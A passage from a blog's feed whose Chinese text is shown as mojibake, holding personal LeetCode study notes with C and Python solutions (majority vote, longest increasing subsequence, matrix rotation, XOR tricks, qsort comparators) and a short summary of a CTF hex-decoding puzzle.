class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;misc&quot;&gt;&lt;a href=&quot;#misc&quot; class=&quot;headerlink&quot; title=&quot;misc:&quot;&gt;&lt;/a&gt;misc:&lt;/h2&gt;&lt;p&gt;èœç‹—æˆªè·äº†ä¸€ä»½æŠ¥æ–‡å¦‚ä¸‹&lt;/p&gt;
&lt;p&gt;ä»æŠ¥æ–‡ä¸­å¯ä»¥è”æƒ³åˆ°æ˜¯md5åŠ å¯†, ä½†è¯•äº†ä¸€ä¸‹, å‘ç°ä¸å¯¹. å†çœ‹æŠ¥æ–‡ä¸­å­—æ¯åªæ˜¯ a-f , æ‰€ä»¥å¯èƒ½æ˜¯åå…­è¿›åˆ¶æ•°, åˆä¸€èˆ¬éƒ½æ˜¯ä¸€ä¸ªå­—èŠ‚ä¸€ä¸ªå­—ç¬¦, è€Œä¸€ä¸ªå­—èŠ‚å­˜æ”¾äºŒä¸ªåå…­è¿›åˆ¶æ•°. æˆ‘ä»¬å°±2ä¸ªä¸€ç»„è½¬æ¢æˆåè¿›åˆ¶, ä½†æ˜¯å¤§äºäº†127, å¯æ‰“å°å­—ç¬¦ASCIIèŒƒå›´åœ¨&lt;strong&gt;0-127&lt;/strong&gt;,  é‚£æˆ‘ä»¬çŸ¥é“ &lt;code&gt;}&lt;/code&gt;å­—ç¬¦çš„ASCIIåå…­è¿›åˆ¶ä¸º &lt;strong&gt;0X7D&lt;/strong&gt;,  å†çœ‹æŠ¥æ–‡æœ€å2ä¸ªå­—ç¬¦ç»„æˆçš„åå…­è¿›åˆ¶æ•° &lt;strong&gt;0xf2&lt;/strong&gt;, ä¸€èˆ¬æˆ‘ä»¬å¯ä»¥æœ‰è¿™ä¸ªæ€è·¯,æ±‚å·®å€¼ ä½†ä¹Ÿæœ‰æœ€åæ²¡æœ‰ç”¨ &lt;strong&gt;}&lt;/strong&gt;ç»“å°¾çš„, è¿™é‡Œå°±ä¸æ˜¯.ğŸ˜‚. ä½†å…¶å®æƒ³åˆ°è¦æŠŠå­—ç¬¦æ‰“å°å‡ºæ¥, è€Œå­—ç¬¦ASCII&lt;strong&gt;0-127&lt;/strong&gt;, é‚£å°±ç›´æ¥è¯•ä¸€è¯•å‡128, ä¸€ä¸‹å­å°±å¯¹äº†, å“ˆå“ˆğŸ˜.&lt;/p&gt;
    
    </summary>
    
    
      <category term="Reverse" scheme="https://www.Bxnop.cn/categories/Reverse/"/>
    
    
  </entry>
  
  <entry>
    <title>leetcode</title>
    <link href="https://www.bxnop.cn/2020/03/14/leetcode/"/>
    <id>https://www.bxnop.cn/2020/03/14/leetcode/</id>
    <published>2020-03-14T05:58:53.000Z</published>
    <updated>2020-06-08T01:21:05.390Z</updated>
    
    <content type="html"><![CDATA[<h2 id="æ‘©å°”æŠ•ç¥¨"><a href="#æ‘©å°”æŠ•ç¥¨" class="headerlink" title="æ‘©å°”æŠ•ç¥¨"></a>æ‘©å°”æŠ•ç¥¨</h2><p>ä¸ªäººæ€»ç»“:</p><p>åœ¨ä¸€ç¾¤ä»¥å°é˜Ÿä¸ºç»„çš„æˆ˜äº‰ä¸­, 2ä¸ªé‡åˆ°è‹¥ä¸æ˜¯åŒé˜Ÿçš„å°±åŒæ–¹é˜µäº¡, è‹¥2ä¸ªäººæ˜¯åŒé˜Ÿçš„å°±ç»“åˆèµ·æ¥.è¿™æ ·ä¸€ç›´ä¸‹å», æœ€åç•™ä¸‹æ¥çš„äºº, å°†æ˜¯è¿™åœºæˆ˜äº‰ä¸­æœ€å¤šçš„äººçš„å°é˜Ÿçš„.è¯¥ç®—æ³•å¯ä»¥è§£å†³ è®¡ç®—ä¸€ä¸ªæ•°ç»„ä¸­å‡ºç°æ¬¡æ•°æœ€å¤šçš„å…ƒç´ . ( ä»ç¬¬ä¸€ä¸ªæ•°å¼€å§‹count=1ï¼Œé‡åˆ°ç›¸åŒçš„å°±åŠ 1ï¼Œé‡åˆ°ä¸åŒçš„å°±å‡1ï¼Œå‡åˆ°0å°±é‡æ–°æ¢ä¸ªæ•°å¼€å§‹è®¡æ•°ï¼Œæ€»èƒ½æ‰¾åˆ°æœ€å¤šçš„é‚£ä¸ª )<a id="more"></a></p><p><img src="/2020/03/14/leetcode/image-20200314141207184-1590548390775.png" alt="image-20200314141207184"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">majorityElement</span><span class="params">(<span class="keyword">int</span>* nums, <span class="keyword">int</span> numsSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> count = <span class="number">0</span>, ans = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; numsSize; i++)</span><br><span class="line">  &#123;</span><br><span class="line">â€‹    <span class="keyword">if</span>(nums[ans] == nums[i])</span><br><span class="line">â€‹      count++;</span><br><span class="line">â€‹    <span class="keyword">else</span></span><br><span class="line">â€‹      count--;</span><br><span class="line">      </span><br><span class="line">â€‹    <span class="keyword">if</span>(count == <span class="number">0</span>)</span><br><span class="line">â€‹      ans = i+<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">â€‹    <span class="keyword">if</span>(count &gt; numsSize/<span class="number">2</span>)</span><br><span class="line">â€‹      <span class="keyword">break</span>; </span><br><span class="line">  &#125;</span><br><span class="line">    </span><br><span class="line">  <span class="keyword">return</span> nums[ans];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="åŠ¨æ€è§„åˆ’"><a href="#åŠ¨æ€è§„åˆ’" class="headerlink" title="åŠ¨æ€è§„åˆ’"></a>åŠ¨æ€è§„åˆ’</h2><p>å°†ä¸€ä¸ªé—®é¢˜, åˆ†æˆè‹¥å¹²ä¸ªçš„å­é—®é¢˜è§£å†³ </p><pre><code>dp[i]è¡¨ç¤ºnums[0]åˆ°nums[i]ï¼Œå«nums[i]çš„æœ€é•¿ä¸Šå‡å­åºåˆ—ï¼›å¦‚æœnums[j] &lt; nums[i],å°±dp[i]=max(dp[i],dp[j]+1)æ¯æ¬¡ä¿å­˜æœ€å¤§é•¿åº¦res=max(res,dp[i]) ////å› ä¸ºæœ€åä¸€ä¸ªå…ƒç´ nums[n],ä¸ä¸€å®šåœ¨æœ€é•¿å­åºåˆ—ä¸­å¦‚[10,9,2,5,3,7,101,6][10,9,2,5,3,7,101,6],dp[0]=1[10,9,2,5,3,7,101,6],dp[1]=1[10,9,2,5,3,7,101,6],dp[2]=1[10,9,2,5,3,7,101,6],dp[3]=dp[2]+1 //res=2[10,9,2,5,3,7,101,6],dp[4]=dp[2]+1 //res=2[10,9,2,5,3,7,101,6],dp[5]=dp[3]+1 //res=3[10,9,2,5,3,7,101,6],dp[6]=dp[5]+1 //res=4[10,9,2,5,3,7,101,6],dp[7]=dp[4]+1 //res=4</code></pre><p><img src="/2020/03/14/leetcode/image-20200314142330565-1590548403309.png" alt="image-20200314142330565"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lengthOfLIS</span><span class="params">(<span class="keyword">int</span>* nums, <span class="keyword">int</span> numsSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(numsSize == <span class="number">0</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">  <span class="keyword">int</span> <span class="built_in">max</span> = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">int</span> dp[numsSize];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; numsSize; i++)</span><br><span class="line">  &#123;</span><br><span class="line">â€‹    dp[i] = <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">â€‹    <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; i; j++) </span><br><span class="line">â€‹    <span class="keyword">if</span>(nums[i] &gt; nums[j])</span><br><span class="line">â€‹    dp[i] = dp[i] &gt; dp[j]+<span class="number">1</span> ? dp[i]:dp[j]+<span class="number">1</span>;</span><br><span class="line">      </span><br><span class="line">â€‹    <span class="keyword">if</span>(dp[i] &gt; <span class="built_in">max</span>)</span><br><span class="line">â€‹    <span class="built_in">max</span> = dp[i];</span><br><span class="line">  &#125; </span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">max</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="æ—‹è½¬çŸ©é˜µ"><a href="#æ—‹è½¬çŸ©é˜µ" class="headerlink" title="æ—‹è½¬çŸ©é˜µ"></a>æ—‹è½¬çŸ©é˜µ</h2><p>å¯¹äºçŸ©é˜µä¸­æ¯ä¸€è¡Œéƒ½æ—‹è½¬90Â°, åœ¨ä¸å ç”¨é¢å¤–ç©ºé—´æƒ…å†µä¸‹. å¯ä»¥å…ˆæŠŠæ•´ä¸ªçŸ©é˜µè½¬ç½®ä¸€ä¸‹, å†å·¦å³çš„2çš„æ•°äº¤æ¢ä¸€ä¸‹ä½ç½®å³å®ç°.</p><p><img src="/2020/03/14/leetcode/image-20200425195006467-1590548409622.png" alt="image-20200425195006467"></p><p>é¢˜è§£:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rotate</span><span class="params">(<span class="keyword">int</span>** matrix, <span class="keyword">int</span> matrixSize, <span class="keyword">int</span>* matrixColSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; matrixSize; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = i+<span class="number">1</span>; j &lt; *matrixColSize; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> temp = matrix[i][j];</span><br><span class="line">matrix[i][j] = matrix[j][i];</span><br><span class="line">matrix[j][i] = temp;</span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> mid = matrixSize &gt;&gt; <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; matrixSize; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; mid; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> temp = matrix[i][j];</span><br><span class="line">matrix[i][j] = matrix[i][matrixSize-j<span class="number">-1</span>];</span><br><span class="line">matrix[i][matrixSize-j<span class="number">-1</span>] = temp;</span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="åˆ†å‰²å­—ç¬¦ä¸²"><a href="#åˆ†å‰²å­—ç¬¦ä¸²" class="headerlink" title="åˆ†å‰²å­—ç¬¦ä¸²"></a>åˆ†å‰²å­—ç¬¦ä¸²</h2><p><strong>ä¸€é“é¢˜ä¸éš¾çš„é¢˜, ä½†æ˜¯è§‰å¾—æ€æƒ³åº”è¯¥è®°ä¸€ä¸‹.</strong></p><p><img src="/2020/03/14/leetcode/image-20200426184623169-1590548415836.png" alt="image-20200426184623169"></p><p>ç¬¬ä¸€ä¸ªæ€è·¯æ˜¯: åªç®¡å·¦è¾¹, ç»Ÿè®¡å·¦è¾¹0å’Œ1å‡ºç°çš„æ¬¡æ•°, åªè¦ä»å·¦åˆ°å³å¾ªç¯, 0å‡ºç°çš„æ¬¡æ•°ä¸1å‡ºç°çš„æ¬¡æ•°ä¹‹å·®æ¯”ç¬¬ä¸€ä¸ªæ¯”å¼€å§‹å¤§, é‚£ä¹ˆæˆ‘ä»¬çš„ç¡®å®šåˆ†å‰²çš„ä½ç½®å°±å¯ä»¥å¾€åç§».å¾ªç¯ä¸€é, æ‰¾åˆ°äº†ä½ç½®, å†åˆ†åˆ«ç›¸åŠ .</p><p><strong>ç¬¬äºŒä¸ªæ€è·¯:</strong> å…ˆæŠŠæ‰€æœ‰çš„ 1 éƒ½ç»Ÿè®¡å‡ºæ¥, å†å·¦å¾€å³å¾ªç¯, åªè¦æ˜¯å­—ç¬¦0å°±åŠ 1, å­—ç¬¦1å°±å‡1.  ç¬¬äºŒä¸ªæ€è·¯ä»£ç : Cè¯­è¨€</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">maxScore</span><span class="params">(<span class="keyword">char</span> * s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> ans = <span class="number">0</span>, count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(s); i++)</span><br><span class="line">count += (s[i] == <span class="number">49</span> ? <span class="number">1</span> : <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(s); i++)</span><br><span class="line">&#123;</span><br><span class="line">count += (s[i] == <span class="number">0</span> ? <span class="number">1</span> : <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">ans = (ans &gt; count ? ans : count);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>python3</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">maxScore</span><span class="params">(self, s: str)</span> -&gt; int:</span></span><br><span class="line">        count = s.count(<span class="string">'1'</span>)</span><br><span class="line">        ans = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> s[:<span class="number">-1</span>]:</span><br><span class="line">            <span class="keyword">if</span> i == <span class="string">'0'</span>:</span><br><span class="line">                count += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                count -= <span class="number">1</span></span><br><span class="line">            ans = max(ans, count)</span><br><span class="line">        <span class="keyword">return</span> ans</span><br></pre></td></tr></table></figure><p>æœ€å, åŒç„¶çš„ç®—æ³•, pythonè™½ç„¶æ–¹ä¾¿,ä½†æ˜¯pythonåœ¨æ—¶é—´å’Œç©ºé—´å¤æ‚åº¦ä¸Š, æ¯”Cè¯­è¨€å¤§å¥½å¤š.</p><h2 id="å¼‚æˆ–è¿ç®—"><a href="#å¼‚æˆ–è¿ç®—" class="headerlink" title="å¼‚æˆ–è¿ç®—"></a>å¼‚æˆ–è¿ç®—</h2><blockquote><p><strong>å¼‚æˆ–è¿ç®—çš„è¿ç”¨, å¯¹é€†å‘åˆ†ææœ‰å¸®åŠ©.</strong></p></blockquote><ul><li><p>é¦–å…ˆå¼‚æˆ–è¿ç®—çš„æ€§è´¨æœ‰.</p><table><thead><tr><th>äº¤æ¢å¾‹</th><th>a ^ b  = b ^ a</th></tr></thead><tbody><tr><td><strong>ç»“åˆå¾‹</strong></td><td><strong>(a ^ b) ^ c = a ^ (b ^ c)</strong></td></tr><tr><td><strong>å¯¹äºä»»ä½•æ•°a</strong></td><td><strong>x ^ x = 0,  x ^ 0 = x</strong></td></tr><tr><td><strong>è‡ªåæ€§</strong></td><td><strong>a ^ b = c  -&gt;  c ^ b = a</strong></td></tr></tbody></table></li><li><p>ç¬¬ä¸€ç§é¢˜å‹: (è¦æ±‚æ˜¯ ç©ºé—´å¤æ‚åº¦ 0(1), æ—¶é—´å¤æ‚åº¦ 0(n))</p><p>åœ¨ä¸€ä¸ªæ•°ç»„ <code>nums</code> ä¸­é™¤ä¸€ä¸ªæ•°å­—åªå‡ºç°ä¸€æ¬¡ä¹‹å¤–, å…¶ä»–æ•°å­—éƒ½å‡ºç°äº†2æ¬¡. è¯·æ‰¾å‡ºé‚£ä¸ªåªå‡ºç°ä¸€æ¬¡çš„æ•°å­—.</p><p><strong>æ€è·¯ä¸€: ç”¨æ•°å­¦çš„æ–¹æ³•,  é¦–å…ˆè®©è®©æ•°ç»„ä¸­éé‡å¤çš„æ•°å­—éƒ½ç›¸åŠ åç­‰2<code>(sum(set(nums)))*2</code>, ç„¶åè®©sè¯¥æ•°ç»„æ±‚å’Œ<code>(sum(nums))</code>, 2è€…åªå·®å¾—åˆ°ç­”æ¡ˆ.</strong></p><p><strong>æ€è·¯äºŒ: ç”±å¼‚æˆ–è¿ç®—çš„æ€§è´¨, æˆ‘ä»¬è®©æ‰€æœ‰çš„å…ƒç´ å¼‚æˆ–è¿ç®—, ç»“æœå°±æ˜¯ç­”æ¡ˆ</strong></p></li><li><p>ç¬¬äºŒç§é¢˜å‹, æ˜¯ç¬¬ä¸€ç§çš„å»¶ä¼¸.</p><p><img src="/2020/03/14/leetcode/image-20200428123916375-1590548423589.png" alt="image-20200428123916375"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span>* <span class="title">singleNumbers</span><span class="params">(<span class="keyword">int</span>* nums, <span class="keyword">int</span> numsSize, <span class="keyword">int</span>* returnSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> sum = <span class="number">0</span>, flag = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> *ans = (<span class="keyword">int</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>)*<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(ans, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="keyword">int</span>)*<span class="number">2</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; numsSize; i++)</span><br><span class="line">sum ^= nums[i];    /æœ‰ç¬¬ä¸€ä¸ªé¢˜å‹, æˆ‘ä»¬çŸ¥é“æœ€åç»“æœæ˜¯ä¸ç›¸åŒä¸¤ä¸ªæ•°çš„å¼‚æˆ–ç»“æœ.</span><br><span class="line"></span><br><span class="line">flag = (-sum)&amp;sum;  /å–sumçš„æ‰€æœ‰ä½ä¸­ç¬¬ä¸€ä¸ªä¸º<span class="number">1</span>çš„ä½.</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; numsSize; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(flag &amp; nums[i])   /å°†ä¸ç›¸åŒçš„ä¸¤ä¸ªæ•°è¿›è¡Œåˆ†ç»„, ä¾æ®ä¸Šé¢è®¡ç®—çš„flag.</span><br><span class="line">ans[<span class="number">0</span>] ^= nums[i];</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">ans[<span class="number">1</span>] ^= nums[i]; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">    *returnSize = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="qsortçš„ä½¿ç”¨"><a href="#qsortçš„ä½¿ç”¨" class="headerlink" title="qsortçš„ä½¿ç”¨"></a>qsortçš„ä½¿ç”¨</h2><p><strong>å¯ä»¥è‡ªå®šä¹‰æ’åºï¼Œæ¯”è‡ªå·±çš„å†™çš„å¿«æ’å¿«å¤šäº†ã€‚int cmp(const void *a, const void *b);</strong></p><p><img src="/2020/03/14/leetcode/image-20200608091627383.png" alt="image-20200608091627383"></p><p>è¿™é“é¢˜è‡ªå·±å†™çš„å¿«æ’è¿‡ä¸äº†ï¼Œåé¢æ¢ç”¨Cåº“çš„qsortè‡ªå®šä¹‰æ’åºå°±å¥½äº†ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> m = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cmp1</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *a, <span class="keyword">const</span> <span class="keyword">void</span> *b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (*(<span class="keyword">int</span> *)a-*(<span class="keyword">int</span> *)b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cmp2</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *a, <span class="keyword">const</span> <span class="keyword">void</span> *b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> *p = (<span class="keyword">int</span> *)a;</span><br><span class="line"><span class="keyword">int</span> *q = (<span class="keyword">int</span> *)b;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">abs</span>(*p-m) == <span class="built_in">abs</span>(*q-m))</span><br><span class="line"><span class="keyword">return</span> *p-*q;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">abs</span>(*p-m)-<span class="built_in">abs</span>(*q-m);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span>* <span class="title">getStrongest</span><span class="params">(<span class="keyword">int</span>* arr, <span class="keyword">int</span> arrSize, <span class="keyword">int</span> k, <span class="keyword">int</span>* returnSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> qsort(arr, arrSize, <span class="keyword">sizeof</span>(<span class="keyword">int</span>), cmp1);</span><br><span class="line"> m = arr[(arrSize<span class="number">-1</span>)/<span class="number">2</span>];</span><br><span class="line"> </span><br><span class="line"> qsort(arr, arrSize, <span class="keyword">sizeof</span>(<span class="keyword">int</span>), cmp2);</span><br><span class="line"> </span><br><span class="line"> *returnSize = k;</span><br><span class="line"> <span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æ€»ç»“ï¼šæ ¹æ®é¢˜ç›®è¦æ±‚è‡ªå®šä¹‰æ’åºæ–¹æ³•ï¼Œè¿˜æ˜¯å¾ˆçµæ´»ã€‚</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;æ‘©å°”æŠ•ç¥¨&quot;&gt;&lt;a href=&quot;#æ‘©å°”æŠ•ç¥¨&quot; class=&quot;headerlink&quot; title=&quot;æ‘©å°”æŠ•ç¥¨&quot;&gt;&lt;/a&gt;æ‘©å°”æŠ•ç¥¨&lt;/h2&gt;&lt;p&gt;ä¸ªäººæ€»ç»“:&lt;/p&gt;
&lt;p&gt;åœ¨ä¸€ç¾¤ä»¥å°é˜Ÿä¸ºç»„çš„æˆ˜äº‰ä¸­, 2ä¸ªé‡åˆ°è‹¥ä¸æ˜¯åŒé˜Ÿçš„å°±åŒæ–¹é˜µäº¡, è‹¥2ä¸ªäººæ˜¯åŒé˜Ÿçš„å°±ç»“åˆèµ·æ¥.è¿™æ ·ä¸€ç›´ä¸‹å», æœ€åç•™ä¸‹æ¥çš„äºº, å°†æ˜¯è¿™åœºæˆ˜äº‰ä¸­æœ€å¤šçš„äººçš„å°é˜Ÿçš„.è¯¥ç®—æ³•å¯ä»¥è§£å†³ è®¡ç®—ä¸€ä¸ªæ•°ç»„ä¸­å‡ºç°æ¬¡æ•°æœ€å¤šçš„å…ƒç´ . ( ä»ç¬¬ä¸€ä¸ªæ•°å¼€å§‹count=1ï¼Œé‡åˆ°ç›¸åŒçš„å°±åŠ 1ï¼Œé‡åˆ°ä¸åŒçš„å°±å‡1ï¼Œå‡åˆ°0å°±é‡æ–°æ¢ä¸ªæ•°å¼€å§‹è®¡æ•°ï¼Œæ€»èƒ½æ‰¾åˆ°æœ€å¤šçš„é‚£ä¸ª )&lt;/p&gt;
    
    </summary>
    
    
      <category term="ç®—æ³•" scheme="https://www.Bxnop.cn/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="ç®—æ³•" scheme="https://www.Bxnop.cn/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>æ±‡ç¼–å­¦ä¹ </title>
    <link href="https://www.bxnop.cn/2020/02/19/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0/"/>
    <id>https://www.bxnop.cn/2020/02/19/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0/</id>
    <published>2020-02-19T11:00:33.000Z</published>
    <updated>2020-05-30T09:26:08.771Z</updated>
    
